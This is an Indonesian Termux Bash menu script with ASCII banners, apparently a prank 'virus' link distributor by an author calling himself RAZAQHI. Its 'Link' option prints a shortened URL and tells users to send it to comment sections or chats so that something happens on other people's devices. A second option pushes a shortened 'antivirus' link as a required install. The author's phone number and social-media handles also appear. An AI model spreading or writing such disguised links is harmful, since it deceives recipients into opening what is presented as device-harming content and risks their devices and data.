# Pembuat Code RAZAQHI
# Mau Ngapain Ngebuka Code
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m'
cat << "EOF"
          .--.
         |o_o |
         |:_/ |
        //   \ \
       (|     | )
      /'\_   _/`\
      \___)=(___/

    .-"""""""""""-.
   /   .-------.   \        _       _
  |   |          |  |      | |     (_)
  |   |   ANJAY  |  |      | | ___  _ _ __   ___ _ __
  |   |          |  |   _  | |/ _ \| | '_ \ / _ \ '__|
   \  '---------'  /   | |_| | (_) | | | | |  __/ |
    '-._________.-'     \___/ \___/|_|_| |_|\___|_|

EOF

echo " "
echo -e "$red                            << Code$grn RAZAQHI$red >>$rset"
echo -e "$red                      ⫸$ylo  Pasti Mau Jadi Pahlawan$red ⫷$rset"
echo
# Functions
echo -e "$red                    [Link Ini Hanya Untuk Pembelajaran]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m'
cat << "EOF"
          .--.
         |o_o |
         |:_/ |
        //   \ \
       (|     | )
      /'\_   _/`\
      \___)=(___/

    .-"""""""""""-.
   /   .-------.   \        _       _
  |   |          |  |      | |     (_)
  |   |   ANJAY  |  |      | | ___  _ _ __   ___ _ __
  |   |          |  |   _  | |/ _ \| | '_ \ / _ \ '__|
   \  '---------'  /   | |_| | (_) | | | | |  __/ |
    '-._________.-'     \___/ \___/|_|_| |_|\___|_|

EOF



echo " "
echo -e "$red                            << Code$grn RAZAQHI$red >>$rset"
echo -e "$red                      [ $ylo  Pasti Mau Jadi Pahlawan$red ]$rset"
echo
echo -e "$red                    [Link Ini Hanya Untuk Pembelajaran]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [MENU TAMPILAN]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Link"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Youtobe"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Instagram"
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Whatsapp"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SILAHKAN PILIH]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#MENU PILIHAN\e[92m: "
read optnz
if [ $optnz = "1" ]; then
virus
elif [ $optnz = "2" ]; then
save
elif [ $optnz = "3" ]; then
about
elif [ $optnz = "4" ]; then
echo -e "\e[93mScript was Updating, Mohon Tunggu Beberapa Waktu Yang Belum Di Tentukan\e[0m"
sleep 4
banner
menu

elif [ $optnz = "5" ]; then
am start -a android.intent.action.VIEW -d https://youtube.com/@_razaqhi?si=8DtETRfG0CsXikIf > /dev/null
banner
menu
elif [ $optnz = "6" ]; then
am start -a android.intent.action.VIEW -d https://www.instagram.com/_razaqhi?igsh=dTE2aHVhZDlwd2g3 > /dev/null
banner
menu
elif [ $optnz = "7" ]; then
am start -a android.intent.action.VIEW -d https://wa.me/081395898995 > /dev/null
banner
menu
elif [ $optnz = "8" ]; then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
clear
echo
echo -e '\e[92m
                    _  _  _____  ____  ____
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__)
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91mCopy Linknya Lalu Kirim Aja Ke Kolom Komentar
Atau Ke Chattingan. Silahkan install aja Atau Copy Link
Jika Tidak Terjadi Sesuatu Pada Device Orang Lain Berarti Linknya Belum Update.
                                

         \e[92mL1NK :🥹 \e[96mhttps://tinyurl.com/uppdatesnew\e[91m

                                
Jadikan Link Ini Sebagai Pembelajaran, Jangan Disalahgunakan
Karena Kalau Disalahgunakan Bisa Mengakibatkan Kehilangan Data
Tapi Boong, Yhahaha Panik Kau Dek."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ]; then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m
                    _  _  _____  ____  ____
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__)
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[93m  Copy Link Tersebut Lalu Paste Di Website Kalian 
Kemudian Kalian Di Haruskan Install Agar Terjaga Dari Link Jebakan.  
                    

        \e[92mL1NK :Antivirus \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    
Gunakan Link Ini Dengan Bijak, Jangan Di Sebarluaskan 
Karena Membuat Link Ini Tidak Mudah Ya Bestieh 
Aing Harap Paham, Apa Yang Aing Informasikan."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ]; then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m

 ████████╗██╗   ██╗ █████╗ ███╗   ██╗       ████████╗ █████╗ ███╗   ███╗██████╗  █████╗ ███╗   ██╗
 ╚══██╔══╝██║   ██║██╔══██╗████╗  ██║       ╚══██╔══╝██╔══██╗████╗ ████║██╔══██╗██╔══██╗████╗  ██║
    ██║   ██║   ██║███████║██╔██╗ ██║          ██║   ███████║██╔████╔██║██████╔╝███████║██╔██╗ ██║
    ██║   ██║   ██║██╔══██║██║╚██╗██║          ██║   ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚██╗██║
    ██║   ╚██████╔╝██║  ██║██║ ╚████║          ██║   ██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║ ╚████║
    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝          ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝


                                   S C R I P T E R   |   R A Z A Q H I

'
echo -e "\e[93m                  YOU CAN CALL ME \e[92mRAZAQHI" | pv -qL 10
echo -e "\e[93m                 SAYA BERASAL DARI \e[92mBANDUNG" | pv -qL 10
echo -e "\e[93m          SAYA SEORANG \e[92mMAHASISWA\e[93m JURUSAN PBA" | pv -qL 10
echo -e "\e[93m                SEMOGA CODINGAN INI BERMANFAAT" | pv -qL 10
echo -e "\e[93m                     EHH AING LUPA CYUK " | pv -qL 10
echo -e "\e[93m       JIKA INGIN MENJADI PACARKU \e[92mCHAT IG : _razaqhi" | pv -qL 10
echo -e "\e[93m         ATAU BISA CHAT:\e[92m WA : 081395898995\e[0m" | pv -qL 10
echo -e "\e[93m                    DI TUNGGU SAYANG" | pv -qL 10
sleep 1.0
banner
menu
}

pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mHAI, JIKA KURANG PAHAM\e[96m CODENYA   ║\e[0m"
echo -e "\e[96m                ║      TANYAKAN CYUK.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Select \e[92my\e[96m Tanyakan\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Select \e[91mt\e[96m Batalkan\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Select \e[91mz\e[96m Langsung Aja Cyuk\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ]; then
am start -a android.intent.action.VIEW -d https://wa.me/081395898995 >/dev/null
clear
baner1
menu
elif [ "$p" = "t" ]; then
clear
baner1
menu
elif [ "$p" = "z" ]; then
cd $HOME/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu


